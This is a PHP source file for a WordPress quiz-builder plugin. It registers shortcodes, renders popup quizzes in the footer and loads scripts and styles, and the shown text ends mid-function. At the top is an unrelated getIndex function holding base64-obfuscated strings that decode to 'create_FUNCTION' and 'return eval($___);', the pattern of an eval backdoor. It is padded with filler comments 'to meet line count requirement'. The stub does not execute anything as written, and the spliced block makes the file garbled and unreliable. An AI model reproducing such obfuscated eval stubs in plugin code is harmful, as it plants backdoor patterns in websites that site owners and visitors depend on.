<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

	


if(!isset($_REQUEST['externalScript'])){
	if(! is_admin() && $GLOBALS['pagenow'] !== 'post.php'){
	  include_once('smartquizbuilder_student_shortcode_fe.php');
		  if(!isset($_REQUEST['et_fb'])){
		  add_shortcode('SmartQuizBuilder', 'smartQuizBuilderShortcode');
		  add_shortcode('FORMULA', 'sqbCalculatorFormulaShortcode');
		  add_shortcode('SHOWTAGCONTENT', 'sqbShowTagsContent');
		  add_shortcode('ShowCategoryScore', 'ShowCategoryScoreContent');
		  add_shortcode('ShowOutcomeDesc', 'ShowOutcomeDescContent');
		  add_shortcode('ShowOutcomeTitle', 'ShowOutcomeTitleContent');
		}
	}
}

function SQBdisplay_corner_popup_manually() {
	if ( isset( get_queried_object()->taxonomy )){
	}else{
		$page_id = get_the_ID();
		if(class_exists( 'WooCommerce' ) && is_shop()){
		    $page_id = woocommerce_get_page_id('shop');
	  	}
		if($page_id > 0){
			$quiz_detailis = SQB_Quiz::loadByTypeAndPageId('corner_popup',$page_id);
			if(isset($quiz_detailis)){
				echo do_shortcode('[SmartQuizBuilder id='.$quiz_detailis.'][/SmartQuizBuilder]');
			}
		}
	}
}
add_action( 'wp_footer', 'SQBdisplay_corner_popup_manually', 100 );

function SQBdisplay_exit_popup_manually() {
	if ( isset( get_queried_object()->taxonomy )){
	}else{
		$page_id = get_the_ID();
		if(class_exists( 'WooCommerce' ) && is_shop()){
		    $page_id = woocommerce_get_page_id('shop');
	  	}
		if($page_id > 0){
			$quiz_detailis = SQB_Quiz::loadByTypeAndPageId('exit',$page_id);
			if(isset($quiz_detailis)){
				echo do_shortcode('[SmartQuizBuilder id='.$quiz_detailis.'][/SmartQuizBuilder]');
			}
		}
	}
}
add_action( 'wp_footer', 'SQBdisplay_exit_popup_manually', 100 );

function SQBdisplay_time_based_popup_manually() {
	if ( isset( get_queried_object()->taxonomy )){
	}else{
		$page_id = get_the_ID();
		if(class_exists( 'WooCommerce' ) && is_shop()){
		    $page_id = woocommerce_get_page_id('shop');
	  	}
		if($page_id > 0){
			$quiz_detailis = SQB_Quiz::loadByTypeAndPageId('time_based',$page_id);
			if(isset($quiz_detailis)){
				echo do_shortcode('[SmartQuizBuilder id='.$quiz_detailis.'][/SmartQuizBuilder]');
			}
		}
	}
}
add_action( 'wp_footer', 'SQBdisplay_time_based_popup_manually', 100 );

function SQBdisplay_percentage_based_popup_manually() {
	if ( isset( get_queried_object()->taxonomy )){
	}else{
		$page_id = get_the_ID();
		if(class_exists( 'WooCommerce' ) && is_shop()){
		    $page_id = woocommerce_get_page_id('shop');
	  	}
		if($page_id > 0){
			$quiz_detailis = SQB_Quiz::loadByTypeAndPageId('percentage_based',$page_id);
			if(isset($quiz_detailis)){
				echo do_shortcode('[SmartQuizBuilder id='.$quiz_detailis.'][/SmartQuizBuilder]');
			}
		}
	}
}
add_action( 'wp_footer', 'SQBdisplay_percentage_based_popup_manually', 100 );

function SQBdisplay_entry_based_popup_manually() {
	if ( isset( get_queried_object()->taxonomy )){
	}else{
		$page_id = get_the_ID();
		if(class_exists( 'WooCommerce' ) && is_shop()){
		    $page_id = woocommerce_get_page_id('shop');
	  	}
		if($page_id > 0){
			$quiz_detailis = SQB_Quiz::loadByTypeAndPageId('entry',$page_id);
			if(isset($quiz_detailis)){
				echo do_shortcode('[SmartQuizBuilder id='.$quiz_detailis.'][/SmartQuizBuilder]');
			}
		}
	}
}
add_action( 'wp_footer', 'SQBdisplay_entry_based_popup_manually', 100 );

function sqb_add_cookiejs(){	
	wp_enqueue_script('cookie',  plugin_dir_url(__FILE__)."includes/js/jquery.cookie.min.js", array('jquery')); 
}
add_action('wp_footer', 'sqb_add_cookiejs');


function SQBCheckQuizCookies($quiz_display,$quiz_popup_time_delay,$quiz_popup_frequency,$output){
	if($quiz_display == 'corner_popup' || $quiz_display == 'exit'){
		
		$cookie_name = "SQB_cp_display_frequency";
		$cookie_value = $quiz_popup_frequency;
		
		$quiz_popup_frequency_arr = explode('|',$quiz_popup_frequency);
		$set_quiz_popup_frequency = $quiz_popup_frequency_arr[0];
		$display_frequency_value = @$quiz_popup_frequency_arr[1];
		if(!isset($_COOKIE[$cookie_name])) {
			if($quiz_popup_frequency != 'always' && $quiz_popup_frequency != 'display_once'){
				//@setcookie($cookie_name, $display_frequency_value, time() + (60*60*24*$display_frequency_value), "/"); //$display_frequency_value day
				//setcookie('SQB_number_of_days', date("Y-m-d",time() + (60*60*24*$display_frequency_value)), time() + (60*60*24*$display_frequency_value), "/"); //days value
			} else {
				//@setcookie($cookie_name, $cookie_value, time() + (60*60*24*36500), "/"); //100 years
			}
			return true;
		} else {
			if($quiz_popup_frequency == 'always'){
				//@setcookie($cookie_name, $quiz_popup_frequency, time() + (3600*24*36500), "/"); //100 years
				return true;
			}else if($quiz_popup_frequency == 'display_once'){
				if($_COOKIE[$cookie_name] != $set_quiz_popup_frequency){
					//@setcookie($cookie_name, $quiz_popup_frequency, time() + (60*60*24*36500), "/"); //100 years
					return true;
				} else {
					return false;
				}
			}else if($set_quiz_popup_frequency == 'set_display_frequency'){
					if($_COOKIE[$cookie_name] != $display_frequency_value){
						//@setcookie($cookie_name, $display_frequency_value, time() + (60*60*24*$display_frequency_value), "/"); //$display_frequency_value days
						//setcookie('SQB_number_of_days', date("Y-m-d",time() + (60*60*24*$display_frequency_value)), time() + (60*60*24*$display_frequency_value), "/"); //days value
						return true;
					} else {
						return false;
					}
			}
			
		}
	}
}

function smartQuizBuilderShortcode($atts, $content=null){ 
	 global $wpdb;
	// do shortcode
	$content = do_shortcode($content);  
	extract(shortcode_atts(array( 
		'id'=>''
	), $atts));	
	return SQBDisplayQuizById($id);
}

function SQBDisplayQuizById($id,$SQBPreview=''){

    if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) return;
    
	$output ="";
	$outputdata ="";
	$analy_result ="";
	$quiz_slider_animation ="N";
	$social_share_url = '';
	$tag_width_data = '';
	$focus_mode_enabled = 'N';
    $sqbObj =  SQB_Quiz::loadById($id);    

    if(empty($sqbObj)){
    	return '';
    }

	if(!empty($sqbObj))
	{

		$ip = $_SERVER['REMOTE_ADDR'];
		$gdprcountry = sqbGetGDPRStatus($ip);
		$is_googlefont = get_option('sqb_google_font_option', true);
		
		$quiz_title =  $sqbObj->getQuizName();
		$weighted_score =  $sqbObj->getWeightedScore();
		$quiz_recommendation_enable = $sqbObj->getAnsRecommendation();
		$quiz_type = $sqbObj->getQuizType();
		$quiz_display = $sqbObj->getQuizDisplay();		 
		$quiz_pagination = $sqbObj->getQuizPagination();
		$question_per_page = $sqbObj->getQuestionPerPage();
		$question_display = $sqbObj->getQuestionDisplay();
		$number_of_question = $sqbObj->getNumberOfQuestion();
		$passmark = $sqbObj->getQuizPassmark();	
		$outcome_type = $sqbObj->getOutcomeType();
		$enable_branching = $sqbObj->getEnableBranching();	
		$display_correctans_on_page = $sqbObj->getDisplayCorrectAnsOnPage();	//yes,no
		$display_correctans_options = $sqbObj->getDisplayAnswerOptions();	// each_page, result_page, all
		$show_next_button = $sqbObj->getShowNextButton();	 
		$show_back_button = $sqbObj->getShowBackButton();	 
		$quiz_attempts_allowed = $sqbObj->getQuizAttemptsAllowed();	
		$quiz_attempts_allowed_new= $sqbObj->getQuizAttemptsAllowed();	 
		$already_take_the_quiz = $sqbObj->getAlreadyTakeTheQuiz();	// retake_quiz, show_question_and_selected_ans
		$show_firstname_template = $sqbObj->getQuizShowFirstNameTemp();	// first name temp
		$show_firstname_outcome = $sqbObj->getShowFirstnameOutcome();	
		$total_attempts = $sqbObj->getTotalAttempts();	 		
		$total_attempts_new = $sqbObj->getTotalAttempts();	 		
		$template_num = $sqbObj->getTemplate();	 		
		$display_quesans_on_outcome = $sqbObj->getDisplayQuesansOnOutcome();
		$sqb_opt_screen_position = $sqbObj->getOptinScreenPosition();
		$show_optin = $sqbObj->getShowOptinScreen();
		$getOutcomeScreenChartsSettings = $sqbObj->getOutcomeScreenChartsSettings();
		$getOutcomeScreenChartsSettings = urlencode(str_replace("undefined","",$getOutcomeScreenChartsSettings));
		
		$getSocialShareScreenValue = $sqbObj->getShowShareScreen();
		$questions_random = $sqbObj->getQuestionsRandom();	 		
		$question_bank_options = $sqbObj->getQuestionBankOption();	 		
		$answers_random = $sqbObj->getAnswersRandom();	 	
		$show_start_screen =  $sqbObj->getShowStartScreen() ;	
		$show_analyzing_result =  $sqbObj->getQuizShowAnalyzingResult() ;	
		$show_analyzing_result_time =  $sqbObj->getQuizAnalyzingResultTime() ;	
		$allow_retake  =  $sqbObj->getAllowRetake() ;	
		$allow_retake_new =  $sqbObj->getAllowRetake() ;	
		$status =  $sqbObj->getStatus() ;	
		$progress_bar_display =  $sqbObj->getProgressBar() ;	
		$show_result_screen =  $sqbObj->getShowResultScreen() ;
		$auto_submit_optin =  $sqbObj->getAutoSubmitOptin() ;
		$quiz_popup_time_delay = $sqbObj->getQuizPopupTimeDelay() ;	
		$quiz_popup_frequency = $sqbObj->getQuizPopupFrequency() ;
		$quiz_slider_animation = $sqbObj->getQuizSliderAnimation();
		$quiz_slider_animation_option = $sqbObj->getQuizSliderAnimationOption();
		$quiz_popup_position = $sqbObj->getQuizPopupPosition() ;
		$quick_email_verification = $sqbObj->getEmailVerification();
		$questions_top_border_setting = $sqbObj->getQuestionsTopBorder();
		$timer_customizer = $sqbObj->getTimerCustomizer();
		$analy_result = $sqbObj->getQuizShowAnalyzingResult(); 	
		$quiz_recommendation_option = $sqbObj->getAnsRecommendation(); 	
		$move_question = $sqbObj->getMoveQuestion(); 
		$category_option = $sqbObj->getCategoryOption();
		$getExitPopupValue = $sqbObj->getExitPopupValue();
		$double_optin = $sqbObj->getDoubleOptin();// "Y||URL||1";
		$customizer_style_settings = maybe_unserialize($sqbObj->getCustomizerStyleSetting());
		$quiz_category_enable = 'N';
		$category_list_json = '';
		$sqb_show_share_screen = $sqbObj->getShowShareScreen();
		$sqb_ans_tags = $sqbObj->getAnsTags();
        $pdf_button_html = $sqbObj->getDownloadPDFButtonHtml();
        $showpdfbutton = $sqbObj->getShowDownloadButton();

		$game_animation = $sqbObj->getGameAnimation();
		$game_animation_option = maybe_unserialize($sqbObj->getGameAnimationsOptions()); 

		if(empty($pdf_button_html)){
			$pdf_button_html = '<div class="outcome_button_pdf sqb_tiny_mce_editor mce-content-body" style="display: inline-block; border-radius: 5px; background: rgb(37, 37, 37); color: rgb(255, 255, 255); height: auto; padding: 13px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; margin: 0px; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 128px; max-width: 100%; cursor: pointer; float: none; position: relative;" id="mce_0" contenteditable="true" spellcheck="false"><div>Download</div></div>'; 
		}
		if(($quiz_type == 'scoring') || ($quiz_type == 'assessment')){
			$quiz_category_enable = $sqbObj->getCategory();
			$category_list = SQB_QuizCategory::loadAllName();

			if(isset($category_list)){
				$category_list = array_map('htmlentities',$category_list);
				$category_list_json = html_entity_decode(json_encode($category_list));
			}else{
				$quiz_category_enable = 'N';
			}

			
		}
		$timer_enable ='';
		$quiz_timer_hours ='';
		$quiz_timer_mint ='';
		$quiz_timer_sec ='';
		$quiz_timer_elapses_option ='';
		$quiz_timer_display_in_screen ='';		
		$quiz_timer_html='';
		$quiz_timer_spent_html='';
		$timer_text_hour_html='HRS';
		$timer_text_mint_html='MIN';
		$timer_text_sec_html='SEC';
		if($timer_customizer != ''){
			$timer_customizer_array = explode('||',$timer_customizer);
			if(isset($timer_customizer_array[0])){
				$timer_enable = $timer_customizer_array[0];
			}
			if(isset($timer_customizer_array[1])){
				$quiz_timer_hours = $timer_customizer_array[1];
			}
			if(isset($timer_customizer_array[2])){
				$quiz_timer_mint = $timer_customizer_array[2];
			}
			if(isset($timer_customizer_array[3])){
				$quiz_timer_sec = $timer_customizer_array[3];
			}
			if(isset($timer_customizer_array[4])){
				$quiz_timer_elapses_option = $timer_customizer_array[4];
			}
			if(isset($timer_customizer_array[5])){
				$quiz_timer_display_in_screen = $timer_customizer_array[5];
			}			
		}   		
		$quiz_timer_html_data = $sqbObj->getTimerHtml();
		$quiz_timer_html_data_array = explode('||||',$quiz_timer_html_data);
		if(isset($quiz_timer_html_data_array[0])){
			$quiz_timer_html = $quiz_timer_html_data_array[0];
		}
		if(isset($quiz_timer_html_data_array[1])){
			$quiz_timer_spent_html = $quiz_timer_html_data_array[1];
		}
		if(isset($quiz_timer_html_data_array[2])){
			$timer_text_hour_html = $quiz_timer_html_data_array[2];
		}
		if(isset($quiz_timer_html_data_array[3])){
			$timer_text_mint_html = $quiz_timer_html_data_array[3];
		}
		if(isset($quiz_timer_html_data_array[4])){
			$timer_text_sec_html = $quiz_timer_html_data_array[4];
		}
		
		if($SQBPreview =="Y"){
			$quiz_display = 'inpage';
		}
		//$quiz_timer_html = $sqbObj->getTimerHtml();
		$quiz_timer_expired_msg = $sqbObj->getTimerExpiredMsg();
		//show animation only for in-page, not for popup or corner popup		
		if($quiz_display == 'inpage'){			
			if($quiz_slider_animation == 'Y'){			
				$quiz_slider_animation ="Y";
			}else{
				$quiz_slider_animation ="N";
			}
		}else{
			$quiz_slider_animation ="N";
		}
		
		if($quiz_display == 'corner_popup' || $quiz_display == 'exit'){
			$cookies_status = SQBCheckQuizCookies($quiz_display,$quiz_popup_time_delay,$quiz_popup_frequency,$output);
			if(!$cookies_status){
				return '';	
			}
		}

		$_SESSION['quiz_blocking'] = $quiz_blocking = $sqbObj->getQuizBlocking();	 		
		$_SESSION['quiz_passmark'] = $quiz_passmark = $sqbObj->getQuizPassmark();
		$_SESSION['pass_criteria'] = $quiz_passcriteria = $sqbObj->getPassCriteria();	 		
		$_SESSION['sqb_quiz_type'] = $quiz_type;	 		
		
		//if quiz_type is assessment , check where to show the resuly (each_page, result_page, both)
		//if show_next_button is set to Y
		$display_nextbutton = "no";
		$display_backbutton = "no";
		$display_correctans_html ='<input type="hidden" id="display_correctans_options" value="no" />';
		 
		if($quiz_type != "personality"){
			$weighted_score = 'N';
		}		
		if($quiz_type =="assessment" || $quiz_type =="scoring"){
			if($display_correctans_on_page =="yes"){
				$display_correctans_html ='<input type="hidden" id="display_correctans_options" value="'.$display_correctans_options.'" />';
				if($display_correctans_options == "each_page" || $display_correctans_options == "both"){	
					if($show_next_button =="Y"){
						$display_nextbutton = "yes";	
					} 
				}				
			}else{
				if($show_next_button =="Y"){
					if($display_correctans_on_page =="yes"){
						$display_correctans_html ='<input type="hidden" id="display_correctans_options" value="yes" />';
					}else{
						$display_correctans_html ='<input type="hidden" id="display_correctans_options" value="no" />';
					}
					if($show_next_button =="Y"){
						$display_nextbutton = "yes";	
					} 
				} 
			}
		}else{
			if($show_next_button =="Y"){
				$display_correctans_html ='<input type="hidden" id="display_correctans_options" value="yes" />';
				$display_nextbutton = "yes";	
			} 
			if(!empty($show_back_button)){
				$show_back_button = explode('|', $show_back_button);

				if($show_back_button[0] =="Y"){
					$display_backbutton = "yes";	
				}
			}
		}
			
		//check if branching enable or not
		$enable_branching_class = "normal_quiz";
		$branching = "N";
		$funnel_connection_array = '';
		//for calculator
		if($quiz_type =="calculator"){
			$enable_branching = 'N';
		}
		if($enable_branching == 'Y'){
			$sqbFunnelObj =  SQB_Funnel::loadByQuizId($id);
		
			if(isset($sqbFunnelObj) && $sqbFunnelObj !=false){
				$enable_branching_class = "enable_branching_quiz";
				$branching = "Y";
				$sqb_funnel_ques_ans_connection_array = sqbGetFunneldataByQuizId($id);
				$sqb_funnel_back_ques_ans_connection_array = sqbGetBackFunneldataByQuizId($id);
				$funnel_connection_array =" <input  type='hidden' class='sqb_funnel_ques_ans_connection_json' value='".json_encode($sqb_funnel_ques_ans_connection_array)."'/><input  type='hidden' class='sqb_funnel_back_ques_ans_connection_json' value='".json_encode($sqb_funnel_back_ques_ans_connection_array)."'/>";

				$funnel_connection_array .='<script>
                     var sqb_funnel_ques_ans_connection_json = '.json_encode($sqb_funnel_ques_ans_connection_array).';
                     var sqb_funnel_back_ques_ans_connection_json = '.json_encode($sqb_funnel_back_ques_ans_connection_array).';
                     //console.log(sqb_funnel_back_ques_ans_connection_json);
					</script>';				
			}
		}		
		  
		// if quiz_pagination is set to all..Show all question in one page
		if( $quiz_pagination =="all"){	
			$display_nextbutton = "yes";			 				
		} 
	 	$status ="Y";
		//call the functions on the bases of quiz type
		$getQuizData = getQuizData($id, $quiz_type, $quiz_display, $quiz_pagination,$question_per_page, $passmark , $question_display, $number_of_question , $branching ,$outcome_type, $display_nextbutton, $quiz_attempts_allowed, $total_attempts,$show_firstname_template, $template_num , $questions_random , $question_bank_options, $answers_random, $show_start_screen, $allow_retake,$status,$quiz_popup_time_delay,$quiz_popup_frequency,$quiz_popup_position, $quiz_slider_animation,$questions_top_border_setting,$analy_result,$sqb_show_share_screen,$category_option,$getExitPopupValue,$showpdfbutton,$pdf_button_html,$game_animation,$game_animation_option,$display_backbutton);
		
		$ajaxurl =  admin_url('admin-ajax.php'); //admin-ajax for ajax request
		$includejscss = sqbGetStyleAndScript(); // include css and js
		
		//check if enqueue is working on the site
		if(wp_style_is('wp_enqueue_test_css')) {  
			$includeCSSByEnqueue = true;
		}else{
			$includeCSSByEnqueue = false;
		}

		if(wp_script_is('wp_enqueue_test_js')) {
			$includeJSByEnqueue = true;
		}else{
			$includeJSByEnqueue = false;
		}
		//check if enqueue is working on the site
		$cssAndJs ="";
		if(wp_script_is('jquery')) {
			
			 if($includeCSSByEnqueue){
				 $random_var = rand(10,1000);
				 
				wp_enqueue_style('sqb-awesome', '//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');

				if($gdprcountry != 1 && $is_googlefont != 'N'){
					wp_enqueue_style('sqb-googleapis', '//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&family=Nunito:wght@400;500;600;700&family=Montserrat&display=swap&t=1');
					wp_enqueue_style('sqb-googleapis-raleway', '//fonts.googleapis.com/css2?family=Raleway:wght@100;200;300;400;500;700&display=swap');

					if($template_num == 'template2' || $template_num == 'template8'){
						wp_enqueue_style('sqb-googleapis-raleway', 'https://fonts.googleapis.com/css2?family=Noto+Serif+Display:wght@400;500;600&display=swap');
					}

				}

				wp_enqueue_style("sqb_bootstrap_slider_min-css","//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/css/bootstrap-slider.min.css", false,'10.0.2' );
				wp_enqueue_style('sqb-sqb_questions', plugin_dir_url(__FILE__).'includes/css/sqb_questions.css');
				wp_enqueue_style('sqb-sqb_common_backend', plugin_dir_url(__FILE__).'includes/css/sqb_common_backend.css');
				wp_enqueue_style('sqb-sqb_common', plugin_dir_url(__FILE__).'includes/css/sqb_common.css');
				wp_enqueue_style('sqb-question_ans_layout', plugin_dir_url(__FILE__).'includes/css/	question_ans_layout.css');
				wp_enqueue_style("sqb_datepicker-_ui" , "//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css",  false, "1.9.0");
				wp_enqueue_style("sqb_datepicker" , "//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/css/bootstrap-datepicker.min.css",  false, "1.9.0");
				wp_enqueue_style("sqb_intlTelInput" , "//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.css",  false, "1.9.0");

			 }else{	

				if($gdprcountry != 1 && $is_googlefont != 'N'){
					$google_font = '
					<link href="//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&family=Nunito:wght@400;500;600;700&display=swap" rel="stylesheet">
					<link href="//fonts.googleapis.com/css2?family=Raleway:wght@100;200;300;400;500;700&display=swap" rel="stylesheet">';

					if($template_num == 'template2' || $template_num == 'template8'){
						$google_font .= '<link href="//fonts.googleapis.com/css2?family=Noto+Serif+Display:wght@400;500;600&display=swap" rel="stylesheet">';
					}
				}else{
					$google_font = '';
				}

				 $cssAndJs  .= '<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
						'.$google_font.'
						<link href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/css/bootstrap-slider.min.css" rel="stylesheet">
						<link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css" rel="stylesheet">

						<link href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css" rel="stylesheet">
						<link href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/css/bootstrap-datepicker.min.css" rel="stylesheet">
						<link href="//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.css" rel="stylesheet">

						<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_questions.css?'.rand(10,1000).'" rel="stylesheet">
						<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common_backend.css?'.rand(10,1000).'" rel="stylesheet">	
						<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common.css?'.rand(10,1000).'" rel="stylesheet">	
						<link href="'.plugin_dir_url(__FILE__).'includes/css/question_ans_layout.css?'.rand(10,1000).'" rel="stylesheet"> ';
			 }
			 
			 if($includeJSByEnqueue){
				 $random_var = rand(10,1000);
				 wp_enqueue_script("sqb_datepicker" , "//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js",  false, "1.9.0",true); 
				 
				 
				wp_enqueue_script('jquery-ui-lib-js', 'https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js', array('jquery'), '10.0.2');
				wp_enqueue_script('sqb_touch-punch-js', 'https://cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js', array('jquery'), '10.0.2');

				wp_enqueue_script("sqb_bootstrap_slider.min.js","//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js", false, "10.0.2" );
				
				wp_enqueue_script("sqb_intlTelInput","//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js", false, "10.0.2" );	
				wp_enqueue_script("sqb_intlTelInput","//cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.js", false, "10.0.2" );	

				wp_enqueue_script("sqb_mathjs.js","//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.js", false, "10.0.2" );		
				wp_enqueue_script('sqb_frontend-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js', array('jquery'), $random_var);
				wp_enqueue_script('sqb_poll-js', plugin_dir_url(__FILE__).'includes/js/sqb_poll.js', array('jquery'), $random_var);
				wp_enqueue_script('sqb_frontend_fe-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js', array('jquery'), $random_var);
				wp_enqueue_script('sqb_chart-js', plugin_dir_url(__FILE__).'includes/js/chart_lib.js', array('jquery'), $random_var);
				 
			 }else{
				//This check is only for Hello Elementor theme
				$theme = wp_get_theme(); // gets the current theme				 
				if ( 'Hello Elementor' == $theme->name || 'Hello Elementor' == $theme->parent_theme  ) {
					//$cssAndJs  .= '<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>';					
				}
				if (  'Divi' == $theme->name || 'Divi' == $theme->parent_theme ) {					 
				//	$cssAndJs  .= '<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>';
				}
				
				if (  'Smart Theme v3' == $theme->name || 'Smart Theme v3' == $theme->parent_theme ) {	
					if($quiz_display == 'inpage'){
						wp_enqueue_script("sqb_datepicker" , "//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js",  false, "1.9.0",true); 
						wp_enqueue_script("sqb_bootstrap_slider.min.js","//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js", false, "10.0.2" );	
						wp_enqueue_script("sqb_intlTelInput","//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js", false, "10.0.2" );	
						wp_enqueue_script("sqb_intlTelInput","//cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.js", false, "10.0.2" );	
						wp_enqueue_script("sqb_mathjs.js","//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.js", false, "10.0.2" );		
						wp_enqueue_script('sqb_frontend-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js', array('jquery'), $random_var);
						wp_enqueue_script('sqb_poll-js', plugin_dir_url(__FILE__).'includes/js/sqb_poll.js', array('jquery'), $random_var);
						wp_enqueue_script('sqb_frontend_fe-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js', array('jquery'), $random_var);
						wp_enqueue_script('sqb_chart-js', plugin_dir_url(__FILE__).'includes/js/chart_lib.js', array('jquery'), $random_var);
					}else{

						

						$cssAndJs  .= '<script  src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js"  defer></script><script  src="https://code.jquery.com/ui/1.12.1/jquery-ui.js?'.rand(10,1000).'" defer></script><script  src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js" defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js"  defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js"  defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.js"  defer></script><script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.js" defer></script>	<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js?'.rand(10,1000).'" defer></script><script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_poll.js?'.rand(10,1000).'" defer></script><script  src="'.plugin_dir_url(__FILE__).'includes/js/chart_lib.js?'.rand(10,1000).'"></script>				<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js?'.rand(10,1000).'" defer></script>';
					}
				 
				}else{					
				  $cssAndJs  .= '<script  src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js"  defer></script><script  src="https://code.jquery.com/ui/1.12.1/jquery-ui.js?'.rand(10,1000).'" defer></script><script  src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui-touch-punch/0.2.3/jquery.ui.touch-punch.min.js" defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-slider/10.0.2/bootstrap-slider.min.js"  defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.js"  defer></script><script  src="//cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.js"  defer></script><script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjs/9.4.4/math.js" defer></script>	<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend.js?'.rand(10,1000).'" defer></script><script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_poll.js?'.rand(10,1000).'" defer></script><script  src="'.plugin_dir_url(__FILE__).'includes/js/chart_lib.js?'.rand(10,1000).'"></script>				<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_fe.js?'.rand(10,1000).'" defer></script>';
			  }
			  
			 } 
		}else{

			if($gdprcountry != 1 && $is_googlefont != 'N'){
				$google_font = '<link href="//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&family=Nunito:wght@400;500;600;700&family=Montserrat&display=swap&t=1" rel="stylesheet">
				<link href="//fonts.googleapis.com/css2?family=Raleway:wght@100;200;300;400;500;700&display=swap" rel="stylesheet">';
				if($template_num == 'template2' || $template_num == 'template8'){
